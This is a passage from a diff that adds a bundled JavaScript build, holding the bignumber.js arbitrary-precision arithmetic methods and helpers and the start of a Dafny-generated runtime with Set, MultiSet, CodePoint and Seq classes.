+    return compare(this, new BigNumber2(y, b));
+  };
+  P.decimalPlaces = P.dp = function(dp, rm) {
+    var c, n, v, x = this;
+    if (dp != null) {
+      intCheck(dp, 0, MAX);
+      if (rm == null) rm = ROUNDING_MODE;
+      else intCheck(rm, 0, 8);
+      return round(new BigNumber2(x), dp + x.e + 1, rm);
+    }
+    if (!(c = x.c)) return null;
+    n = ((v = c.length - 1) - bitFloor(this.e / LOG_BASE)) * LOG_BASE;
+    if (v = c[v]) for (; v % 10 == 0; v /= 10, n--) ;
+    if (n < 0) n = 0;
+    return n;
+  };
+  P.dividedBy = P.div = function(y, b) {
+    return div(this, new BigNumber2(y, b), DECIMAL_PLACES, ROUNDING_MODE);
+  };
+  P.dividedToIntegerBy = P.idiv = function(y, b) {
+    return div(this, new BigNumber2(y, b), 0, 1);
+  };
+  P.exponentiatedBy = P.pow = function(n, m) {
+    var half, isModExp, i, k, more, nIsBig, nIsNeg, nIsOdd, y, x = this;
+    n = new BigNumber2(n);
+    if (n.c && !n.isInteger()) {
+      throw Error(bignumberError + "Exponent not an integer: " + valueOf(n));
+    }
+    if (m != null) m = new BigNumber2(m);
+    nIsBig = n.e > 14;
+    if (!x.c || !x.c[0] || x.c[0] == 1 && !x.e && x.c.length == 1 || !n.c || !n.c[0]) {
+      y = new BigNumber2(Math.pow(+valueOf(x), nIsBig ? n.s * (2 - isOdd(n)) : +valueOf(n)));
+      return m ? y.mod(m) : y;
+    }
+    nIsNeg = n.s < 0;
+    if (m) {
+      if (m.c ? !m.c[0] : !m.s) return new BigNumber2(NaN);
+      isModExp = !nIsNeg && x.isInteger() && m.isInteger();
+      if (isModExp) x = x.mod(m);
+    } else if (n.e > 9 && (x.e > 0 || x.e < -1 || (x.e == 0 ? x.c[0] > 1 || nIsBig && x.c[1] >= 24e7 : x.c[0] < 8e13 || nIsBig && x.c[0] <= 9999975e7))) {
+      k = x.s < 0 && isOdd(n) ? -0 : 0;
+      if (x.e > -1) k = 1 / k;
+      return new BigNumber2(nIsNeg ? 1 / k : k);
+    } else if (POW_PRECISION) {
+      k = mathceil(POW_PRECISION / LOG_BASE + 2);
+    }
+    if (nIsBig) {
+      half = new BigNumber2(0.5);
+      if (nIsNeg) n.s = 1;
+      nIsOdd = isOdd(n);
+    } else {
+      i = Math.abs(+valueOf(n));
+      nIsOdd = i % 2;
+    }
+    y = new BigNumber2(ONE);
+    for (; ; ) {
+      if (nIsOdd) {
+        y = y.times(x);
+        if (!y.c) break;
+        if (k) {
+          if (y.c.length > k) y.c.length = k;
+        } else if (isModExp) {
+          y = y.mod(m);
+        }
+      }
+      if (i) {
+        i = mathfloor(i / 2);
+        if (i === 0) break;
+        nIsOdd = i % 2;
+      } else {
+        n = n.times(half);
+        round(n, n.e + 1, 1);
+        if (n.e > 14) {
+          nIsOdd = isOdd(n);
+        } else {
+          i = +valueOf(n);
+          if (i === 0) break;
+          nIsOdd = i % 2;
+        }
+      }
+      x = x.times(x);
+      if (k) {
+        if (x.c && x.c.length > k) x.c.length = k;
+      } else if (isModExp) {
+        x = x.mod(m);
+      }
+    }
+    if (isModExp) return y;
+    if (nIsNeg) y = ONE.div(y);
+    return m ? y.mod(m) : k ? round(y, POW_PRECISION, ROUNDING_MODE, more) : y;
+  };
+  P.integerValue = function(rm) {
+    var n = new BigNumber2(this);
+    if (rm == null) rm = ROUNDING_MODE;
+    else intCheck(rm, 0, 8);
+    return round(n, n.e + 1, rm);
+  };
+  P.isEqualTo = P.eq = function(y, b) {
+    return compare(this, new BigNumber2(y, b)) === 0;
+  };
+  P.isFinite = function() {
+    return !!this.c;
+  };
+  P.isGreaterThan = P.gt = function(y, b) {
+    return compare(this, new BigNumber2(y, b)) > 0;
+  };
+  P.isGreaterThanOrEqualTo = P.gte = function(y, b) {
+    return (b = compare(this, new BigNumber2(y, b))) === 1 || b === 0;
+  };
+  P.isInteger = function() {
+    return !!this.c && bitFloor(this.e / LOG_BASE) > this.c.length - 2;
+  };
+  P.isLessThan = P.lt = function(y, b) {
+    return compare(this, new BigNumber2(y, b)) < 0;
+  };
+  P.isLessThanOrEqualTo = P.lte = function(y, b) {
+    return (b = compare(this, new BigNumber2(y, b))) === -1 || b === 0;
+  };
+  P.isNaN = function() {
+    return !this.s;
+  };
+  P.isNegative = function() {
+    return this.s < 0;
+  };
+  P.isPositive = function() {
+    return this.s > 0;
+  };
+  P.isZero = function() {
+    return !!this.c && this.c[0] == 0;
+  };
+  P.minus = function(y, b) {
+    var i, j, t, xLTy, x = this, a = x.s;
+    y = new BigNumber2(y, b);
+    b = y.s;
+    if (!a || !b) return new BigNumber2(NaN);
+    if (a != b) {
+      y.s = -b;
+      return x.plus(y);
+    }
+    var xe = x.e / LOG_BASE, ye = y.e / LOG_BASE, xc = x.c, yc = y.c;
+    if (!xe || !ye) {
+      if (!xc || !yc) return xc ? (y.s = -b, y) : new BigNumber2(yc ? x : NaN);
+      if (!xc[0] || !yc[0]) {
+        return yc[0] ? (y.s = -b, y) : new BigNumber2(xc[0] ? x : (
+          // IEEE 754 (2008) 6.3: n - n = -0 when rounding to -Infinity
+          ROUNDING_MODE == 3 ? -0 : 0
+        ));
+      }
+    }
+    xe = bitFloor(xe);
+    ye = bitFloor(ye);
+    xc = xc.slice();
+    if (a = xe - ye) {
+      if (xLTy = a < 0) {
+        a = -a;
+        t = xc;
+      } else {
+        ye = xe;
+        t = yc;
+      }
+      t.reverse();
+      for (b = a; b--; t.push(0)) ;
+      t.reverse();
+    } else {
+      j = (xLTy = (a = xc.length) < (b = yc.length)) ? a : b;
+      for (a = b = 0; b < j; b++) {
+        if (xc[b] != yc[b]) {
+          xLTy = xc[b] < yc[b];
+          break;
+        }
+      }
+    }
+    if (xLTy) {
+      t = xc;
+      xc = yc;
+      yc = t;
+      y.s = -y.s;
+    }
+    b = (j = yc.length) - (i = xc.length);
+    if (b > 0) for (; b--; xc[i++] = 0) ;
+    b = BASE - 1;
+    for (; j > a; ) {
+      if (xc[--j] < yc[j]) {
+        for (i = j; i && !xc[--i]; xc[i] = b) ;
+        --xc[i];
+        xc[j] += BASE;
+      }
+      xc[j] -= yc[j];
+    }
+    for (; xc[0] == 0; xc.splice(0, 1), --ye) ;
+    if (!xc[0]) {
+      y.s = ROUNDING_MODE == 3 ? -1 : 1;
+      y.c = [y.e = 0];
+      return y;
+    }
+    return normalise(y, xc, ye);
+  };
+  P.modulo = P.mod = function(y, b) {
+    var q, s, x = this;
+    y = new BigNumber2(y, b);
+    if (!x.c || !y.s || y.c && !y.c[0]) {
+      return new BigNumber2(NaN);
+    } else if (!y.c || x.c && !x.c[0]) {
+      return new BigNumber2(x);
+    }
+    if (MODULO_MODE == 9) {
+      s = y.s;
+      y.s = 1;
+      q = div(x, y, 0, 3);
+      y.s = s;
+      q.s *= s;
+    } else {
+      q = div(x, y, 0, MODULO_MODE);
+    }
+    y = x.minus(q.times(y));
+    if (!y.c[0] && MODULO_MODE == 1) y.s = x.s;
+    return y;
+  };
+  P.multipliedBy = P.times = function(y, b) {
+    var c, e, i, j, k, m, xcL, xlo, xhi, ycL, ylo, yhi, zc, base2, sqrtBase, x = this, xc = x.c, yc = (y = new BigNumber2(y, b)).c;
+    if (!xc || !yc || !xc[0] || !yc[0]) {
+      if (!x.s || !y.s || xc && !xc[0] && !yc || yc && !yc[0] && !xc) {
+        y.c = y.e = y.s = null;
+      } else {
+        y.s *= x.s;
+        if (!xc || !yc) {
+          y.c = y.e = null;
+        } else {
+          y.c = [0];
+          y.e = 0;
+        }
+      }
+      return y;
+    }
+    e = bitFloor(x.e / LOG_BASE) + bitFloor(y.e / LOG_BASE);
+    y.s *= x.s;
+    xcL = xc.length;
+    ycL = yc.length;
+    if (xcL < ycL) {
+      zc = xc;
+      xc = yc;
+      yc = zc;
+      i = xcL;
+      xcL = ycL;
+      ycL = i;
+    }
+    for (i = xcL + ycL, zc = []; i--; zc.push(0)) ;
+    base2 = BASE;
+    sqrtBase = SQRT_BASE;
+    for (i = ycL; --i >= 0; ) {
+      c = 0;
+      ylo = yc[i] % sqrtBase;
+      yhi = yc[i] / sqrtBase | 0;
+      for (k = xcL, j = i + k; j > i; ) {
+        xlo = xc[--k] % sqrtBase;
+        xhi = xc[k] / sqrtBase | 0;
+        m = yhi * xlo + xhi * ylo;
+        xlo = ylo * xlo + m % sqrtBase * sqrtBase + zc[j] + c;
+        c = (xlo / base2 | 0) + (m / sqrtBase | 0) + yhi * xhi;
+        zc[j--] = xlo % base2;
+      }
+      zc[j] = c;
+    }
+    if (c) {
+      ++e;
+    } else {
+      zc.splice(0, 1);
+    }
+    return normalise(y, zc, e);
+  };
+  P.negated = function() {
+    var x = new BigNumber2(this);
+    x.s = -x.s || null;
+    return x;
+  };
+  P.plus = function(y, b) {
+    var t, x = this, a = x.s;
+    y = new BigNumber2(y, b);
+    b = y.s;
+    if (!a || !b) return new BigNumber2(NaN);
+    if (a != b) {
+      y.s = -b;
+      return x.minus(y);
+    }
+    var xe = x.e / LOG_BASE, ye = y.e / LOG_BASE, xc = x.c, yc = y.c;
+    if (!xe || !ye) {
+      if (!xc || !yc) return new BigNumber2(a / 0);
+      if (!xc[0] || !yc[0]) return yc[0] ? y : new BigNumber2(xc[0] ? x : a * 0);
+    }
+    xe = bitFloor(xe);
+    ye = bitFloor(ye);
+    xc = xc.slice();
+    if (a = xe - ye) {
+      if (a > 0) {
+        ye = xe;
+        t = yc;
+      } else {
+        a = -a;
+        t = xc;
+      }
+      t.reverse();
+      for (; a--; t.push(0)) ;
+      t.reverse();
+    }
+    a = xc.length;
+    b = yc.length;
+    if (a - b < 0) {
+      t = yc;
+      yc = xc;
+      xc = t;
+      b = a;
+    }
+    for (a = 0; b; ) {
+      a = (xc[--b] = xc[b] + yc[b] + a) / BASE | 0;
+      xc[b] = BASE === xc[b] ? 0 : xc[b] % BASE;
+    }
+    if (a) {
+      xc = [a].concat(xc);
+      ++ye;
+    }
+    return normalise(y, xc, ye);
+  };
+  P.precision = P.sd = function(sd, rm) {
+    var c, n, v, x = this;
+    if (sd != null && sd !== !!sd) {
+      intCheck(sd, 1, MAX);
+      if (rm == null) rm = ROUNDING_MODE;
+      else intCheck(rm, 0, 8);
+      return round(new BigNumber2(x), sd, rm);
+    }
+    if (!(c = x.c)) return null;
+    v = c.length - 1;
+    n = v * LOG_BASE + 1;
+    if (v = c[v]) {
+      for (; v % 10 == 0; v /= 10, n--) ;
+      for (v = c[0]; v >= 10; v /= 10, n++) ;
+    }
+    if (sd && x.e + 1 > n) n = x.e + 1;
+    return n;
+  };
+  P.shiftedBy = function(k) {
+    intCheck(k, -MAX_SAFE_INTEGER, MAX_SAFE_INTEGER);
+    return this.times("1e" + k);
+  };
+  P.squareRoot = P.sqrt = function() {
+    var m, n, r, rep, t, x = this, c = x.c, s = x.s, e = x.e, dp = DECIMAL_PLACES + 4, half = new BigNumber2("0.5");
+    if (s !== 1 || !c || !c[0]) {
+      return new BigNumber2(!s || s < 0 && (!c || c[0]) ? NaN : c ? x : 1 / 0);
+    }
+    s = Math.sqrt(+valueOf(x));
+    if (s == 0 || s == 1 / 0) {
+      n = coeffToString(c);
+      if ((n.length + e) % 2 == 0) n += "0";
+      s = Math.sqrt(+n);
+      e = bitFloor((e + 1) / 2) - (e < 0 || e % 2);
+      if (s == 1 / 0) {
+        n = "5e" + e;
+      } else {
+        n = s.toExponential();
+        n = n.slice(0, n.indexOf("e") + 1) + e;
+      }
+      r = new BigNumber2(n);
+    } else {
+      r = new BigNumber2(s + "");
+    }
+    if (r.c[0]) {
+      e = r.e;
+      s = e + dp;
+      if (s < 3) s = 0;
+      for (; ; ) {
+        t = r;
+        r = half.times(t.plus(div(x, t, dp, 1)));
+        if (coeffToString(t.c).slice(0, s) === (n = coeffToString(r.c)).slice(0, s)) {
+          if (r.e < e) --s;
+          n = n.slice(s - 3, s + 1);
+          if (n == "9999" || !rep && n == "4999") {
+            if (!rep) {
+              round(t, t.e + DECIMAL_PLACES + 2, 0);
+              if (t.times(t).eq(x)) {
+                r = t;
+                break;
+              }
+            }
+            dp += 4;
+            s += 4;
+            rep = 1;
+          } else {
+            if (!+n || !+n.slice(1) && n.charAt(0) == "5") {
+              round(r, r.e + DECIMAL_PLACES + 2, 1);
+              m = !r.times(r).eq(x);
+            }
+            break;
+          }
+        }
+      }
+    }
+    return round(r, r.e + DECIMAL_PLACES + 1, ROUNDING_MODE, m);
+  };
+  P.toExponential = function(dp, rm) {
+    if (dp != null) {
+      intCheck(dp, 0, MAX);
+      dp++;
+    }
+    return format2(this, dp, rm, 1);
+  };
+  P.toFixed = function(dp, rm) {
+    if (dp != null) {
+      intCheck(dp, 0, MAX);
+      dp = dp + this.e + 1;
+    }
+    return format2(this, dp, rm);
+  };
+  P.toFormat = function(dp, rm, format3) {
+    var str2, x = this;
+    if (format3 == null) {
+      if (dp != null && rm && typeof rm == "object") {
+        format3 = rm;
+        rm = null;
+      } else if (dp && typeof dp == "object") {
+        format3 = dp;
+        dp = rm = null;
+      } else {
+        format3 = FORMAT;
+      }
+    } else if (typeof format3 != "object") {
+      throw Error(bignumberError + "Argument not an object: " + format3);
+    }
+    str2 = x.toFixed(dp, rm);
+    if (x.c) {
+      var i, arr = str2.split("."), g1 = +format3.groupSize, g2 = +format3.secondaryGroupSize, groupSeparator = format3.groupSeparator || "", intPart = arr[0], fractionPart = arr[1], isNeg = x.s < 0, intDigits = isNeg ? intPart.slice(1) : intPart, len = intDigits.length;
+      if (g2) {
+        i = g1;
+        g1 = g2;
+        g2 = i;
+        len -= i;
+      }
+      if (g1 > 0 && len > 0) {
+        i = len % g1 || g1;
+        intPart = intDigits.substr(0, i);
+        for (; i < len; i += g1) intPart += groupSeparator + intDigits.substr(i, g1);
+        if (g2 > 0) intPart += groupSeparator + intDigits.slice(i);
+        if (isNeg) intPart = "-" + intPart;
+      }
+      str2 = fractionPart ? intPart + (format3.decimalSeparator || "") + ((g2 = +format3.fractionGroupSize) ? fractionPart.replace(
+        new RegExp("\\d{" + g2 + "}\\B", "g"),
+        "$&" + (format3.fractionGroupSeparator || "")
+      ) : fractionPart) : intPart;
+    }
+    return (format3.prefix || "") + str2 + (format3.suffix || "");
+  };
+  P.toFraction = function(md) {
+    var d, d0, d1, d2, e, exp, n, n0, n1, q, r, s, x = this, xc = x.c;
+    if (md != null) {
+      n = new BigNumber2(md);
+      if (!n.isInteger() && (n.c || n.s !== 1) || n.lt(ONE)) {
+        throw Error(bignumberError + "Argument " + (n.isInteger() ? "out of range: " : "not an integer: ") + valueOf(n));
+      }
+    }
+    if (!xc) return new BigNumber2(x);
+    d = new BigNumber2(ONE);
+    n1 = d0 = new BigNumber2(ONE);
+    d1 = n0 = new BigNumber2(ONE);
+    s = coeffToString(xc);
+    e = d.e = s.length - x.e - 1;
+    d.c[0] = POWS_TEN[(exp = e % LOG_BASE) < 0 ? LOG_BASE + exp : exp];
+    md = !md || n.comparedTo(d) > 0 ? e > 0 ? d : n1 : n;
+    exp = MAX_EXP;
+    MAX_EXP = 1 / 0;
+    n = new BigNumber2(s);
+    n0.c[0] = 0;
+    for (; ; ) {
+      q = div(n, d, 0, 1);
+      d2 = d0.plus(q.times(d1));
+      if (d2.comparedTo(md) == 1) break;
+      d0 = d1;
+      d1 = d2;
+      n1 = n0.plus(q.times(d2 = n1));
+      n0 = d2;
+      d = n.minus(q.times(d2 = d));
+      n = d2;
+    }
+    d2 = div(md.minus(d0), d1, 0, 1);
+    n0 = n0.plus(d2.times(n1));
+    d0 = d0.plus(d2.times(d1));
+    n0.s = n1.s = x.s;
+    e = e * 2;
+    r = div(n1, d1, e, ROUNDING_MODE).minus(x).abs().comparedTo(
+      div(n0, d0, e, ROUNDING_MODE).minus(x).abs()
+    ) < 1 ? [n1, d1] : [n0, d0];
+    MAX_EXP = exp;
+    return r;
+  };
+  P.toNumber = function() {
+    return +valueOf(this);
+  };
+  P.toPrecision = function(sd, rm) {
+    if (sd != null) intCheck(sd, 1, MAX);
+    return format2(this, sd, rm, 2);
+  };
+  P.toString = function(b) {
+    var str2, n = this, s = n.s, e = n.e;
+    if (e === null) {
+      if (s) {
+        str2 = "Infinity";
+        if (s < 0) str2 = "-" + str2;
+      } else {
+        str2 = "NaN";
+      }
+    } else {
+      if (b == null) {
+        str2 = e <= TO_EXP_NEG || e >= TO_EXP_POS ? toExponential(coeffToString(n.c), e) : toFixedPoint(coeffToString(n.c), e, "0");
+      } else if (b === 10 && alphabetHasNormalDecimalDigits) {
+        n = round(new BigNumber2(n), DECIMAL_PLACES + e + 1, ROUNDING_MODE);
+        str2 = toFixedPoint(coeffToString(n.c), n.e, "0");
+      } else {
+        intCheck(b, 2, ALPHABET.length, "Base");
+        str2 = convertBase(toFixedPoint(coeffToString(n.c), e, "0"), 10, b, s, true);
+      }
+      if (s < 0 && n.c[0]) str2 = "-" + str2;
+    }
+    return str2;
+  };
+  P.valueOf = P.toJSON = function() {
+    return valueOf(this);
+  };
+  P._isBigNumber = true;
+  P[Symbol.toStringTag] = "BigNumber";
+  P[/* @__PURE__ */ Symbol.for("nodejs.util.inspect.custom")] = P.valueOf;
+  if (configObject != null) BigNumber2.set(configObject);
+  return BigNumber2;
+}
+function bitFloor(n) {
+  var i = n | 0;
+  return n > 0 || n === i ? i : i - 1;
+}
+function coeffToString(a) {
+  var s, z2, i = 1, j = a.length, r = a[0] + "";
+  for (; i < j; ) {
+    s = a[i++] + "";
+    z2 = LOG_BASE - s.length;
+    for (; z2--; s = "0" + s) ;
+    r += s;
+  }
+  for (j = r.length; r.charCodeAt(--j) === 48; ) ;
+  return r.slice(0, j + 1 || 1);
+}
+function compare(x, y) {
+  var a, b, xc = x.c, yc = y.c, i = x.s, j = y.s, k = x.e, l = y.e;
+  if (!i || !j) return null;
+  a = xc && !xc[0];
+  b = yc && !yc[0];
+  if (a || b) return a ? b ? 0 : -j : i;
+  if (i != j) return i;
+  a = i < 0;
+  b = k == l;
+  if (!xc || !yc) return b ? 0 : !xc ^ a ? 1 : -1;
+  if (!b) return k > l ^ a ? 1 : -1;
+  j = (k = xc.length) < (l = yc.length) ? k : l;
+  for (i = 0; i < j; i++) if (xc[i] != yc[i]) return xc[i] > yc[i] ^ a ? 1 : -1;
+  return k == l ? 0 : k > l ^ a ? 1 : -1;
+}
+function intCheck(n, min, max, name) {
+  if (n < min || n > max || n !== mathfloor(n)) {
+    throw Error(bignumberError + (name || "Argument") + (typeof n == "number" ? n < min || n > max ? " out of range: " : " not an integer: " : " not a primitive number: ") + String(n));
+  }
+}
+function isOdd(n) {
+  var k = n.c.length - 1;
+  return bitFloor(n.e / LOG_BASE) == k && n.c[k] % 2 != 0;
+}
+function toExponential(str2, e) {
+  return (str2.length > 1 ? str2.charAt(0) + "." + str2.slice(1) : str2) + (e < 0 ? "e" : "e+") + e;
+}
+function toFixedPoint(str2, e, z2) {
+  var len, zs;
+  if (e < 0) {
+    for (zs = z2 + "."; ++e; zs += z2) ;
+    str2 = zs + str2;
+  } else {
+    len = str2.length;
+    if (++e > len) {
+      for (zs = z2, e -= len; --e; zs += z2) ;
+      str2 += zs;
+    } else if (e < len) {
+      str2 = str2.slice(0, e) + "." + str2.slice(e);
+    }
+  }
+  return str2;
+}
+var BigNumber = clone2();
+
+// src/formal/generated/kernel.ts
+BigNumber.config({ MODULO_MODE: BigNumber.EUCLID });
+var _dafny = (function() {
+  let $module = {};
+  $module.areEqual = function(a, b) {
+    if (typeof a === "string" && b instanceof _dafny.Seq) {
+      return b.equals(a);
+    } else if (typeof a === "number" && BigNumber.isBigNumber(b)) {
+      return b.isEqualTo(a);
+    } else if (typeof a !== "object" || a === null || b === null) {
+      return a === b;
+    } else if (BigNumber.isBigNumber(a)) {
+      return a.isEqualTo(b);
+    } else if (a._tname !== void 0 || Array.isArray(a) && a.constructor.name == "Array") {
+      return a === b;
+    } else {
+      return a.equals(b);
+    }
+  };
+  $module.toString = function(a) {
+    if (a === null) {
+      return "null";
+    } else if (typeof a === "number") {
+      return a.toFixed();
+    } else if (BigNumber.isBigNumber(a)) {
+      return a.toFixed();
+    } else if (a._tname !== void 0) {
+      return a._tname;
+    } else {
+      return a.toString();
+    }
+  };
+  $module.escapeCharacter = function(cp) {
+    let s = String.fromCodePoint(cp.value);
+    switch (s) {
+      case "\n":
+        return "\\n";
+      case "\r":
+        return "\\r";
+      case "	":
+        return "\\t";
+      case "\0":
+        return "\\0";
+      case "'":
+        return "\\'";
+      case '"':
+        return '\\"';
+      case "\\":
+        return "\\\\";
+      default:
+        return s;
+    }
+    ;
+  };
+  $module.NewObject = function() {
+    return { _tname: "object" };
+  };
+  $module.InstanceOfTrait = function(obj, trait) {
+    return obj._parentTraits !== void 0 && obj._parentTraits().includes(trait);
+  };
+  $module.Rtd_bool = class {
+    static get Default() {
+      return false;
+    }
+  };
+  $module.Rtd_char = class {
+    static get Default() {
+      return "D";
+    }
+    // See CharType.DefaultValue in Dafny source code
+  };
+  $module.Rtd_codepoint = class {
+    static get Default() {
+      return new _dafny.CodePoint("D".codePointAt(0));
+    }
+  };
+  $module.Rtd_int = class {
+    static get Default() {
+      return BigNumber(0);
+    }
+  };
+  $module.Rtd_number = class {
+    static get Default() {
+      return 0;
+    }
+  };
+  $module.Rtd_ref = class {
+    static get Default() {
+      return null;
+    }
+  };
+  $module.Rtd_array = class {
+    static get Default() {
+      return [];
+    }
+  };
+  $module.ZERO = new BigNumber(0);
+  $module.ONE = new BigNumber(1);
+  $module.NUMBER_LIMIT = new BigNumber(32).multipliedBy(281474976710656);
+  $module.Tuple = class Tuple extends Array {
+    constructor(...elems) {
+      super(...elems);
+    }
+    toString() {
+      return "(" + arrayElementsToString(this) + ")";
+    }
+    equals(other) {
+      if (this === other) {
+        return true;
+      }
+      for (let i = 0; i < this.length; i++) {
+        if (!_dafny.areEqual(this[i], other[i])) {
+          return false;
+        }
+      }
+      return true;
+    }
+    static Default(...values) {
+      return Tuple.of(...values);
+    }
+    static Rtd(...rtdArgs) {
+      return {
+        Default: Tuple.from(rtdArgs, (rtd) => rtd.Default)
+      };
+    }
+  };
+  $module.Set = class Set2 extends Array {
+    constructor() {
+      super();
+    }
+    static get Default() {
+      return Set2.Empty;
+    }
+    toString() {
+      return "{" + arrayElementsToString(this) + "}";
+    }
+    static get Empty() {
+      if (this._empty === void 0) {
+        this._empty = new Set2();
+      }
+      return this._empty;
+    }
+    static fromElements(...elmts) {
+      let s = new Set2();
+      for (let k of elmts) {
+        s.add(k);
+      }
+      return s;
+    }
+    contains(k) {
+      for (let i = 0; i < this.length; i++) {
+        if (_dafny.areEqual(this[i], k)) {
+          return true;
+        }
+      }
+      return false;
+    }
+    add(k) {
+      if (!this.contains(k)) {
+        this.push(k);
+      }
+    }
+    equals(other) {
+      if (this === other) {
+        return true;
+      } else if (this.length !== other.length) {
+        return false;
+      }
+      for (let e of this) {
+        if (!other.contains(e)) {
+          return false;
+        }
+      }
+      return true;
+    }
+    get Elements() {
+      return this;
+    }
+    Union(that) {
+      if (this.length === 0) {
+        return that;
+      } else if (that.length === 0) {
+        return this;
+      } else {
+        let s = Set2.of(...this);
+        for (let k of that) {
+          s.add(k);
+        }
+        return s;
+      }
+    }
+    Intersect(that) {
+      if (this.length === 0) {
+        return this;
+      } else if (that.length === 0) {
+        return that;
+      } else {
+        let s = new Set2();
+        for (let k of this) {
+          if (that.contains(k)) {
+            s.push(k);
+          }
+        }
+        return s;
+      }
+    }
+    Difference(that) {
+      if (this.length == 0 || that.length == 0) {
+        return this;
+      } else {
+        let s = new Set2();
+        for (let k of this) {
+          if (!that.contains(k)) {
+            s.push(k);
+          }
+        }
+        return s;
+      }
+    }
+    IsDisjointFrom(that) {
+      for (let k of this) {
+        if (that.contains(k)) {
+          return false;
+        }
+      }
+      return true;
+    }
+    IsSubsetOf(that) {
+      if (that.length < this.length) {
+        return false;
+      }
+      for (let k of this) {
+        if (!that.contains(k)) {
+          return false;
+        }
+      }
+      return true;
+    }
+    IsProperSubsetOf(that) {
+      if (that.length <= this.length) {
+        return false;
+      }
+      for (let k of this) {
+        if (!that.contains(k)) {
+          return false;
+        }
+      }
+      return true;
+    }
+    get AllSubsets() {
+      return this.AllSubsets_();
+    }
+    *AllSubsets_() {
+      let elmts = Array.of(...this);
+      let n = elmts.length;
+      let which = new Array(n);
+      which.fill(false);
+      let a = [];
+      while (true) {
+        yield Set2.of(...a);
+        let i = 0;
+        for (; i < n && which[i]; i++) {
+          which[i] = false;
+          for (let j = 0; j < a.length; j++) {
+            if (_dafny.areEqual(a[j], elmts[i])) {
+              a[j] = a[-1];
+              a.pop();
+              break;
+            }
+          }
+        }
+        if (i === n) {
+          break;
+        }
+        which[i] = true;
+        a.push(elmts[i]);
+      }
+    }
+  };
+  $module.MultiSet = class MultiSet extends Array {
+    constructor() {
+      super();
+    }
+    static get Default() {
+      return MultiSet.Empty;
+    }
+    toString() {
+      let s = "multiset{";
+      let sep3 = "";
+      for (let e of this) {
+        let [k, n] = e;
+        let ks = _dafny.toString(k);
+        while (!n.isZero()) {
+          n = n.minus(1);
+          s += sep3 + ks;
+          sep3 = ", ";
+        }
+      }
+      s += "}";
+      return s;
+    }
+    static get Empty() {
+      if (this._empty === void 0) {
+        this._empty = new MultiSet();
+      }
+      return this._empty;
+    }
+    static fromElements(...elmts) {
+      let s = new MultiSet();
+      for (let e of elmts) {
+        s.add(e, _dafny.ONE);
+      }
+      return s;
+    }
+    static FromArray(arr) {
+      let s = new MultiSet();
+      for (let e of arr) {
+        s.add(e, _dafny.ONE);
+      }
+      return s;
+    }
+    cardinality() {
+      let c = _dafny.ZERO;
+      for (let e of this) {
+        let [k, n] = e;
+        c = c.plus(n);
+      }
+      return c;
+    }
+    clone() {
+      let s = new MultiSet();
+      for (let e of this) {
+        let [k, n] = e;
+        s.push([k, n]);
+      }
+      return s;
+    }
+    findIndex(k) {
+      for (let i = 0; i < this.length; i++) {
+        if (_dafny.areEqual(this[i][0], k)) {
+          return i;
+        }
+      }
+      return this.length;
+    }
+    get(k) {
+      let i = this.findIndex(k);
+      if (i === this.length) {
+        return _dafny.ZERO;
+      } else {
+        return this[i][1];
+      }
+    }
+    contains(k) {
+      return !this.get(k).isZero();
+    }
+    add(k, n) {
+      let i = this.findIndex(k);
+      if (i === this.length) {
+        this.push([k, n]);
+      } else {
+        let m = this[i][1];
+        this[i] = [k, m.plus(n)];
+      }
+    }
+    update(k, n) {
+      let i = this.findIndex(k);
+      if (i < this.length && this[i][1].isEqualTo(n)) {
+        return this;
+      } else if (i === this.length && n.isZero()) {
+        return this;
+      } else if (i === this.length) {
+        let m = this.slice();
+        m.push([k, n]);
+        return m;
+      } else {
+        let m = this.slice();
+        m[i] = [k, n];
+        return m;
+      }
+    }
+    equals(other) {
+      if (this === other) {
+        return true;
+      }
+      for (let e of this) {
+        let [k, n] = e;
+        let m = other.get(k);
+        if (!n.isEqualTo(m)) {
+          return false;
+        }
+      }
+      return this.cardinality().isEqualTo(other.cardinality());
+    }
+    get Elements() {
+      return this.Elements_();
+    }
+    *Elements_() {
+      for (let i = 0; i < this.length; i++) {
+        let [k, n] = this[i];
+        while (!n.isZero()) {
+          yield k;
+          n = n.minus(1);
+        }
+      }
+    }
+    get UniqueElements() {
+      return this.UniqueElements_();
+    }
+    *UniqueElements_() {
+      for (let e of this) {
+        let [k, n] = e;
+        if (!n.isZero()) {
+          yield k;
+        }
+      }
+    }
+    Union(that) {
+      if (this.length === 0) {
+        return that;
+      } else if (that.length === 0) {
+        return this;
+      } else {
+        let s = this.clone();
+        for (let e of that) {
+          let [k, n] = e;
+          s.add(k, n);
+        }
+        return s;
+      }
+    }
+    Intersect(that) {
+      if (this.length === 0) {
+        return this;
+      } else if (that.length === 0) {
+        return that;
+      } else {
+        let s = new MultiSet();
+        for (let e of this) {
+          let [k, n] = e;
+          let m = that.get(k);
+          if (!m.isZero()) {
+            s.push([k, m.isLessThan(n) ? m : n]);
+          }
+        }
+        return s;
+      }
+    }
+    Difference(that) {
+      if (this.length === 0 || that.length === 0) {
+        return this;
+      } else {
+        let s = new MultiSet();
+        for (let e of this) {
+          let [k, n] = e;
+          let d = n.minus(that.get(k));
+          if (d.isGreaterThan(0)) {
+            s.push([k, d]);
+          }
+        }
+        return s;
+      }
+    }
+    IsDisjointFrom(that) {
+      let intersection2 = this.Intersect(that);
+      return intersection2.cardinality().isZero();
+    }
+    IsSubsetOf(that) {
+      for (let e of this) {
+        let [k, n] = e;
+        let m = that.get(k);
+        if (!n.isLessThanOrEqualTo(m)) {
+          return false;
+        }
+      }
+      return true;
+    }
+    IsProperSubsetOf(that) {
+      return this.IsSubsetOf(that) && this.cardinality().isLessThan(that.cardinality());
+    }
+  };
+  $module.CodePoint = class CodePoint {
+    constructor(value) {
+      this.value = value;
+    }
+    equals(other) {
+      if (this === other) {
+        return true;
+      }
+      return this.value === other.value;
+    }
+    isLessThan(other) {
+      return this.value < other.value;
+    }
+    isLessThanOrEqual(other) {
+      return this.value <= other.value;
+    }
+    toString() {
+      return "'" + $module.escapeCharacter(this) + "'";
+    }
+    static isCodePoint(i) {
+      return _dafny.ZERO.isLessThanOrEqualTo(i) && i.isLessThan(new BigNumber(55296)) || new BigNumber(57344).isLessThanOrEqualTo(i) && i.isLessThan(new BigNumber(1114112));
+    }
+  };
+  $module.Seq = class Seq extends Array {
+    constructor(...elems) {
+      super(...elems);
+    }
+    static get Default() {
+      return Seq.of();
+    }
+    static Create(n, init) {
+      return Seq.from({ length: n }, (_, i) => init(new BigNumber(i)));
+    }
+    static UnicodeFromString(s) {
+      return new Seq(...[...s].map((c) => new _dafny.CodePoint(c.codePointAt(0))));
+    }
+    toString() {
